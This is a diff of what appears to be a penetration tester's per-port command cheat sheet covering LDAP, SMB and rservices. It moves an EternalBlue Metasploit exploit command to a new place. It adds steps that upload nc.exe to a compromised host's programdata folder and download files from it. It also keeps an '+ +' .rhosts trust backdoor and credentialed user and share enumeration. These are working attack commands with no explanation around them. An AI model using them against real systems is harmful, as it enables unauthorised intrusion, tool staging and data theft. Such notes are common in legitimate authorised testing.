@@ -124,7 +124,6 @@ ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "" -s base "(obj
 ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
 
 [*] (445) SMB
-msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 (nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames &)
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 impacket-samrdump "$TARGET"
@@ -386,7 +385,11 @@ msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set S
 sessions -i 1
 shares -i C$
 cd programdata
-upload nc.exe
+lcd ~/Uploads
+upload ~/Uploads/windows/nc.exe
+download file.txt
+
+msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 
 [*] (512-514) RSERVICES
 echo '+ +' > .rhosts; chmod 600 .rhosts
